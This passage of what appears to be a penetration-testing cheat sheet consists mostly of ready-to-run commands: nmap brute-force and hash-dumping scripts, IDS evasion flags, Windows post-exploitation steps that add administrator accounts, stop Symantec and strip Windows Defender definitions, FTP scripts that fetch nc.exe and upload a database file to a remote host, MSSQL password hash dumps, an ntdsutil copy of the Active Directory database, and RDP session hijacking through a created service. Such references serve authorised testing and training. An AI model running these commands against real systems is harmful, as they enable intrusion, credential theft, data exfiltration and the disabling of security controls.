<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>nmap -p 111,2049 --script nfs-ls,nfs-showmount
</pre></div>
</td></tr></table>

<p>UDP scan:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>nmap -sU -F -Pn -v -d -sC -sV --open --reason -T5
</pre></div>
</td></tr></table>

<p>Anonymous FTP</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>nmap -sC -sV -p21
nmap -sV -n -sS -Pn-vv --open -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221
</pre></div>
</td></tr></table>

<p>VNC Brute</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>nmap --script=vnc-brute -p5800,5900
</pre></div>
</td></tr></table>

<p>Rawr Scan</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>nmap -sV --open -T4 -v7 -p80,280,443,591,593,981,1311,2031,2480,3181,4444,4445,4567,4711,4712,5104,5280,5800,5988,5989,7000,7001,7002,8008,8011,8012,8013,8014,8042,8069,8080,8081,8243,8280,8281,8531,8887,8888,9080,9443,11371,12443,16080,18091,18092 -iL live-hosts.txt -oA web
</pre></div>
</td></tr></table>

<p>MSSQL Scan</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>nmap -vv-sV -Pn-n -p1433 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa -oA
</pre></div>
</td></tr></table>

<p>HTTP Scan</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>nmap -vv -sS -Pn-n -p80,443,8080 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-email-harvest,http-methods,http-method-tamper,http-passwd,http-robots.txt -oA
</pre></div>
</td></tr></table>

<h3 id="ids-evasion">IDS Evasion<a class="headerlink" href="#ids-evasion" title="Permanent link">&para;</a></h3>
<p>Append extra random data to change default packet lengths</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>–data-length 15
</pre></div>
</td></tr></table>

<p>Randomize scan order</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>-randomize-hosts
</pre></div>
</td></tr></table>

<h2 id="web">Web<a class="headerlink" href="#web" title="Permanent link">&para;</a></h2>
<h3 id="eyewitness">Eyewitness<a class="headerlink" href="#eyewitness" title="Permanent link">&para;</a></h3>
<p>Get the most recent version</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>git clone https://github.com/ChrisTruncer/EyeWitness.git
</pre></div>
</td></tr></table>

<p>Faster Scan</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>./EyeWitness.py --web -f hosts.txt --timeout 5 --threads 10 -d /mnt/event/Recon/ew --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https
</pre></div>
</td></tr></table>

<p>Slow version via proxychains</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>proxychains ./EyeWitness.py --web -f hosts.txt --timeout 10 --threads 2 -d /mnt/event/Recon/ew --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https

proxychains ./EyeWitness.py --web -x nmaphosts.xml --timeout 10 --threads 2 -d /mnt/event/Recon/ew2 --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https
</pre></div>
</td></tr></table>

<p>Proxychains specify a remote DNS server</p>
<p><a href="http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html">http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html</a></p>
<p>On Kali linux its found here: /usr/lib/proxychains3/proxyresolv</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="ch">#!/bin/sh</span>

<span class="c1"># This script is called by proxychains to resolve DNS names</span>

<span class="c1"># DNS server used to resolve names</span>
<span class="nv">DNS_SERVER</span><span class="o">=</span><span class="m">4</span>.2.2.2

<span class="k">if</span> <span class="o">[</span> <span class="nv">$#</span> <span class="o">=</span> <span class="m">0</span> <span class="o">]</span> <span class="p">;</span> <span class="k">then</span>
<span class="nb">echo</span> <span class="s2">&quot; usage:&quot;</span>
<span class="nb">echo</span> <span class="s2">&quot; proxyresolv &quot;</span>
<span class="nb">exit</span>
<span class="k">fi</span>

<span class="nb">export</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span>libproxychains.so.3
dig <span class="nv">$1</span> @<span class="nv">$DNS_SERVER</span> +tcp <span class="p">|</span> awk <span class="s1">&#39;/A.+[0-9]+.[0-9]+.[0-9]/{print $5;}&#39;</span>
</pre></div>
</td></tr></table>

<p><em>Use Canary tokens to identify web front-end vulnerabilities</em></p>
<p>In combination with Burp collaborator, identify configuration issues with web front-end appliances</p>
<p>For example, issue request to target domain with a custom Host header pointing to your collaborator/canary:</p>
<p>Request:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">uniqid.burpcollaborator.net</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
</pre></div>
</td></tr></table>

<p>Response (on Collaborator):</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="nf">GET</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">XX.X.XXX.XX:8082</span>

HTTP/1.1 200 Connection Established
Date: Tue, 07 Feb 2017 16:32:50 GMT
Transfer-Encoding: chunked
Connection: close

Ok
/ HTTP/1.1 is unavailable
Ok
Unknown Command
Ok
Unknown Command
Ok
Unknown Command
Ok
</pre></div>
</td></tr></table>

<p><a href="https://canarytokens.org/generate#">Canarytokens.org</a><br />
<a href="http://blog.portswigger.net/2017/07/cracking-lens-targeting-https-hidden.html">Blog – Targeting HTTP's Hidden Attack Surface</a></p>
<h2 id="built-in-commands">Built-in Commands<a class="headerlink" href="#built-in-commands" title="Permanent link">&para;</a></h2>
<p>View your current user:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>whoami
</pre></div>
</td></tr></table>

<p>View information about the current user:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>net user myuser(for a local user)
net user myuser /domain (for a domain user)
</pre></div>
</td></tr></table>

<p>View the local groups:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>net localgroup
</pre></div>
</td></tr></table>

<p>View the local administrators:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>net localgroup Administrators
</pre></div>
</td></tr></table>

<p>Add a new user:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>net user myuser mypass /add
</pre></div>
</td></tr></table>

<p>Add a user in the local Administrators group:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>net localgroup Administrators myuser /add
</pre></div>
</td></tr></table>

<p>View the domain name of current machine:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>net config workstation
net config server
</pre></div>
</td></tr></table>

<p>View the name of the domain controller:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>reg query &quot;HKEY_LOCAL_MACHINE SOFTWAREMicrosoftWindows CurrentVersionGroup Policy History&quot; /v DCName
</pre></div>
</td></tr></table>

<p>or</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Import-Module ActiveDirectory; (Get-ADDomainController -DomainName corp.test.com -Discover -NextClosestSite).HostName
</pre></div>
</td></tr></table>

<p>or</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>set l
</pre></div>
</td></tr></table>

<p>Get list of DCs</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>nltest /dclist:domainname
</pre></div>
</td></tr></table>

<p>or</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>netdom query /D:domin DC
</pre></div>
</td></tr></table>

<p>or</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>dsquery server
</pre></div>
</td></tr></table>

<p>or</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>nslookup -type=srv _ldap._tcp.dc._msdcs.corp.test.com
</pre></div>
</td></tr></table>

<p>Get DC Info</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>nltest /dsgetdc:domain
</pre></div>
</td></tr></table>

<p>Get DC site mapping</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>nltest /dsaddresstosite:dcname.corp.test.com
</pre></div>
</td></tr></table>

<p>Get PDC</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>netdom query /D:domain PDC
</pre></div>
</td></tr></table>

<p>or</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>nslookup -type=srv _ldap._tcp.pdc._msdcs.corp.test.com
</pre></div>
</td></tr></table>

<p>or get roles</p>
<p>Get Roles</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>netdom query /D:domain FSMO
</pre></div>
</td></tr></table>

<p>View the list of domain users:</p>
<p><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="x">C:&gt; wmic useraccount where (domain=&#39;%USERDOMAIN%&#39;) get Name &gt; userlist.txt</span>

<span class="x">PS C:&gt; ([adsisearcher]&quot;objectCategory=User&quot;).Findall() | ForEach</span>
<span class="cp">{</span><span class="nv">$_.properties.samaccountname</span><span class="cp">}</span><span class="x"> | Sort | Out-File -Encoding ASCII users.txt</span>
</pre></div>
</td></tr></table>
or</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>net user /domain
</pre></div>
</td></tr></table>

<p>Get domain info (including DC)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>gpresult /z
</pre></div>
</td></tr></table>

<p>View the list of domain admins:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>net group &quot;Domain Admins&quot; /domain
</pre></div>
</td></tr></table>

<p>View domain groups</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>net group /domain
powershell (new-object system.directoryservices.directorysearcher(&quot;(&amp;amp;(objectcategory=user)(samaccountname=$($env:username)))&quot;)).FindOne().GetDirectoryEntry().memberof
</pre></div>
</td></tr></table>

<p>View the list of started services (search for antivirus):</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>net start
sc query
</pre></div>
</td></tr></table>

<p>Stop a service:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>net stop &quot;Symantec Endpoint Protection&quot;
</pre></div>
</td></tr></table>

<p>View the list of started processes and the owner:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>tasklist /v
</pre></div>
</td></tr></table>

<p>Kill a process by its name:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>taskkill /F /IM &quot;cmd.exe&quot;
</pre></div>
</td></tr></table>

<p>Abort a shutdown/restart countdown:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>shutdown /a
</pre></div>
</td></tr></table>

<p>Download an executable from a remote FTP server:</p>
<p><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>echo open 10.1.2.3&gt; C:script.txt
echo user myftpuser&gt;&gt; C:script.txt
echo pass myftppass&gt;&gt; C:script.txt
echo get nc.exe&gt;&gt; C:script.txt
echo bye&gt;&gt; C:script.txt
ftp -s:script.txt
</pre></div>
</td></tr></table>
Upload a file to a remote FTP server:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>echo open 10.1.2.3&gt; C:script.txt
echo user myftpuser&gt;&gt; C:script.txt
echo pass myftppass&gt;&gt; C:script.txt
echo put E:backupsdatabase.dbf&gt;&gt; C:script.txt
echo bye&gt;&gt; C:script.txt
ftp -s:script.txt
</pre></div>
</td></tr></table>

<p>WMI call remote system</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="nt">wmic</span> <span class="o">/</span><span class="nt">node</span><span class="p">:</span><span class="nd">remote_computer</span> <span class="nt">process</span> <span class="nt">call</span> <span class="nt">create</span> <span class="s2">&quot;netstat.exe -ano &amp;gt; C:output.txt&quot;</span>
</pre></div>
</td></tr></table>

<p>View established connections of current machine:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>netstat -a -n -p tcp | find &quot;ESTAB&quot;
</pre></div>
</td></tr></table>

<p>View open ports of current machine:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>netstat -a -n -p tcp | find &quot;LISTEN&quot;

netstat -a -n -p udp
</pre></div>
</td></tr></table>

<p>View network configuration:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>netsh interface ip show addresses
netsh interface ip show route
netsh interface ip show neighbors
</pre></div>
</td></tr></table>

<p>View current network shares:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>net share
</pre></div>
</td></tr></table>

<p>Mount a remote share with the rights of the current user:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>net use K: \10.1.2.3C$
</pre></div>
</td></tr></table>

<p>Enable Remote Desktop:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>reg add &quot;HKLMSystemCurrentControlSetControlTerminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f
</pre></div>
</td></tr></table>

<p>One-Liner Windows Enumeration<br />
Reference: <a href="https://gist.github.com/KyleHanslovan/cadf9737401b85422c84091855473eb7">https://gist.github.com/KyleHanslovan/cadf9737401b85422c84091855473eb7</a></p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>whoami &amp;amp; hostname &amp;amp; ipconfig /all &amp;amp; net user /domain 2&amp;gt;&amp;amp;1 &amp;amp; net group /domain 2&amp;gt;&amp;amp;1 &amp;amp; net group &quot;domain admins&quot; /domain 2&amp;gt;&amp;amp;1 &amp;amp; net group &quot;Exchange Trusted Subsystem&quot; /domain 2&amp;gt;&amp;amp;1 &amp;amp; net accounts /domain 2&amp;gt;&amp;amp;1 &amp;amp; net user 2&amp;gt;&amp;amp;1 &amp;amp; net localgroup administrators 2&amp;gt;&amp;amp;1 &amp;amp; netstat -an 2&amp;gt;&amp;amp;1 &amp;amp; tasklist 2&amp;gt;&amp;amp;1 &amp;amp; sc query 2&amp;gt;&amp;amp;1 &amp;amp; systeminfo 2&amp;gt;&amp;amp;1 &amp;amp; reg query &quot;HKEY_CURRENT_USERSoftwareMicrosoftTerminal Server ClientDefault&quot; 2&amp;gt;&amp;amp;1 &amp;amp; net view &amp;amp; net view /domain &amp;amp; net user %USERNAME% /domain &amp;amp; nltest /dclist &amp;amp; gpresult /z
</pre></div>
</td></tr></table>

<p>Check for unquoted service paths</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;c:windows\&quot; | findstr /i /v &quot;&quot;&quot;
</pre></div>
</td></tr></table>

<p>or</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>gwmi win32_service |Select pathname | Where {($_.pathname -ne $null)} | Where {-not $_.pathname.StartsWith(&quot;`&quot;&quot;)} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(&quot;.&quot;) +4)) -match &quot;.* .*&quot;}
</pre></div>
</td></tr></table>

<p>Change Windows Proxy Settings</p>
<p>Command to enable proxy usage:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>reg add &quot;HKCUSoftwareMicrosoftWindowsCurrentVersionInternet Settings&quot; /v ProxyEnable /t REG_DWORD /d 1 /f
</pre></div>
</td></tr></table>

<p>Command to disable proxy usage:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>reg add &quot;HKCUSoftwareMicrosoftWindowsCurrentVersionInternet Settings&quot; /v ProxyEnable /t REG_DWORD /d 0 /f
</pre></div>
</td></tr></table>

<p>Command to change the proxy address:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>reg add &quot;HKCUSoftwareMicrosoftWindowsCurrentVersionInternet Settings&quot; /v ProxyServer /t REG_SZ /d proxyserveraddress:proxyport /f
</pre></div>
</td></tr></table>

<p>Also, in this case, it is a per-user setting than a system-wide setting.</p>
<p>Mount a .win image remotely on target machine</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Dism /get-wiminfo /wimfile:z:win7Acme_Win7.wim

Boot Dir
Dism /Mount-Wim /WimFile:z:win7Acme_Win7.wim /index:1 /MountDir:C:windowstempoffline

C: Drive
Dism /Mount-Wim /WimFile:z:win7Acme_Win7.wim /index:2 /MountDir:C:windowstempoffline

Dism /UnMount-Wim /MountDir:C:windowstempoffline /discard
</pre></div>
</td></tr></table>

<p>Check if file is locked</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>@echo off; 2&amp;gt;nul ( &amp;gt;&amp;gt;file.txt echo off) &amp;amp;&amp;amp; (echo not locked) || (echo locked)
</pre></div>
</td></tr></table>

<p>Lock a file for testing</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>(&gt;&amp;2 pause) &gt;&gt; file.txt
</pre></div>
</td></tr></table>

<h3 id="dsquery">DSQUERY<a class="headerlink" href="#dsquery" title="Permanent link">&para;</a></h3>
<p>Get attributes for all Windows hosts in the Domain</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>dsquery * -filter &quot;(&amp;amp;(objectclass=computer) (objectcategory=computer) (operatingSystem=Windows*))&quot; -limit 0 |dsget computer -dn -samid -desc -loc &amp;gt;c:windowstempcomputers.log
</pre></div>
</td></tr></table>

<p>Get attributes for computers in a specific OU</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>dsquery computer  -limit 0 |dsget computer -dn -samid -desc -l &amp;gt;c:windowstempout.log
</pre></div>
</td></tr></table>

<p>Get attributes for users in the specified OU</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>dsquery user  -limit 0 |dsget user -dn -samid -display -desc -office -tel -email -title -hmdir -profile -loscr -mustchpwd -canchpwd -pwdneverexpires -disabled
</pre></div>
</td></tr></table>

<p>Get DC</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>dsquery server -forest
</pre></div>
</td></tr></table>

<p>or</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>dsquery server -o rdn -forest
</pre></div>
</td></tr></table>

<p>Get Domain Functional Level</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>dsquery * &quot;DC=corp,DC=test,DC=com&quot; -scope base -attr msDS-Behavior-Version ntMixedDomain
</pre></div>
</td></tr></table>

<p>Get Forest Functional Level</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>dsquery * &quot;CN=Partitions,CN=Configuration,DC=corp,DC=test,DC=com&quot; -scope base -attr msDS-Behavior-Version ntMixedDomain
</pre></div>
</td></tr></table>

<h3 id="sqlcmd">SQLCMD<a class="headerlink" href="#sqlcmd" title="Permanent link">&para;</a></h3>
<p>List Databases</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>sqlcmd -E -S localhost -Q &quot;EXEC sp_databases;&quot;
</pre></div>
</td></tr></table>

<p>List Tables in Database</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>sqlcmd -E -S localhost -Q &quot;SELECT * FROM DatabaseName.information_schema.tables;&quot; -W -w 999 -s&quot;,&quot; -o &quot;c:windowstempRecruiterProd_MSCRM_tables.csv&quot;
</pre></div>
</td></tr></table>

<p>Retrieve table contents</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>sqlcmd -E -S localhost -d DatabaseName -Q &quot;SELECT * FROM SystemUserBase;&quot; -W -w 999 -s&quot;,&quot; -o &quot;c:windowstempRecruiterProd_MSCRM_userbase.csv&quot;
</pre></div>
</td></tr></table>

<p>Dump MSSQL Password Hashes</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>sqlcmd -E -S localhost -Q &quot;SELECT name, password_hash FROM master.sys.sql_logins;&quot;
</pre></div>
</td></tr></table>

<h3 id="ntdsutil">NTDSUTIL<a class="headerlink" href="#ntdsutil" title="Permanent link">&para;</a></h3>
<p>Built-in utility to create backup copy of the AD database</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:temp&quot; q q
</pre></div>
</td></tr></table>

<h3 id="applocker">Applocker<a class="headerlink" href="#applocker" title="Permanent link">&para;</a></h3>
<p>List Applocker's effective policy on the system</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-ApplockerPolicy -Effective
</pre></div>
</td></tr></table>

<h3 id="windows-defender">Windows Defender<a class="headerlink" href="#windows-defender" title="Permanent link">&para;</a></h3>
<p>Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">c</span><span class="o">:</span><span class="n">program</span> <span class="n">fileswindows</span> <span class="n">defendermpcmdrun</span><span class="o">.</span><span class="na">exe</span><span class="err">&quot;</span> <span class="o">-</span><span class="n">RemoveDefinitions</span> <span class="o">-</span><span class="n">All</span> <span class="n">Set</span><span class="o">-</span><span class="n">MpPreference</span> <span class="o">-</span><span class="n">DisableIOAVProtection</span> <span class="n">$true</span>
</pre></div>
</td></tr></table>

<h3 id="appcmd">APPCMD<a class="headerlink" href="#appcmd" title="Permanent link">&para;</a></h3>
<p>Get virtual directories in IIS</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="n">c</span><span class="o">:</span><span class="n">windowssystem32inetsrvappcmd</span><span class="o">.</span><span class="na">exe</span> <span class="n">list</span> <span class="n">vdir</span> <span class="o">/</span><span class="n">text</span><span class="o">:</span><span class="n">physicalpath</span>
</pre></div>
</td></tr></table>

<h2 id="windows-lateral-movement">Windows Lateral Movement<a class="headerlink" href="#windows-lateral-movement" title="Permanent link">&para;</a></h2>
<p>RDP Hijacking</p>
<p>If you have SYSTEM context on a host, you can assume the RDP sessions of other users without credentials using the tscon.exe command.</p>
<p>Gain access to cmd.exe to issue the tscon.exe command over RDP by creating a backdoor with Stickkeys or Utilman. Use scheduled tasks (as SYSTEM) or create a service to execute the desired command.</p>
<p><a href="https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6">RDP hijacking — how to hijack RDS and RemoteApp sessions transparently to move through an organisation</a></p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="codehilite"><pre><span></span># View RDP sessions on system your RDP&#39;d to with administrative permissions

# Locally
quser

# Remote
quser /server:

# Create a service that will swap your SESSIONNAME with the desired disconnected session
sc create sesshijack binpath= &quot;cmd.exe /k tscon 1 /dest:rdp-tcp#XX&quot; error= &quot;ignore&quot;

# Start service
net start sesshijack
or
sc start sesshijack
</pre></div>
</td></tr></table>

<p>Linux to Windows Remoting</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>winrm set winrm/config/Service/Auth @{Basic=&quot;true&quot;}
winrm set winrm/config/Service @{AllowUnencrypted=&quot;true&quot;}

$cred = Get-Credential
Enter-PSSession -ComputerName &#39;winserver1&#39; -Credential $cred -Authentication Basic
</pre></div>
</td></tr></table>

<p>PowerShell Remoting over SSH</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Enter-PSSession -Hostname -Username james -SSHTransport
</pre></div>
</td></tr></table>

